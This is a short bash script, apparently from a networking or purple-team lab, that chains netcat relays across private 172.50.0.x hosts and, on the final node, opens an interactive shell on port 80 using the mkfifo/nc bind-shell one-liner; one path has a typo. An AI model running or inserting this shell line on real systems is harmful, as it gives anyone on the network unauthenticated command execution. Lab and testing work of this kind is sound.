#!/bin/bash

num=$1
total=$2
round=$3
shared_dir=$4
timeout=$5
breaktime=$6
loop=0

echo "I'm listening" > "/purple/results/data.txt"
#echo "Again" > "${shared_dir}/results/${round}/dsta${num}.txt"

if [ $num == $total ]; then
	#nc -lk 80 >> "${shared_dir}/results/${round}/net_data${num}.txt"
	rm -f /tmp/f; mkfifo tmp/f
	cat /tmp/f | /bin/sh -i 2>&1 | nc -lk 80 >/tmp/f
	#echo "Hi There"
else
	mkfifo backpipe
	echo "172.50.0.$(($num+2))"
	nc -lk 80 <backpipe | nc "172.50.0.$(($num+2))" 80 1>backpipe
fi

#while [ $loop -ne -1 ]
#do
#	nc -lk 80 >> "${shared_dir}/results/${round}/net_data${num}.txt"
#done


#Do we need the sepreat breaktime and total values.
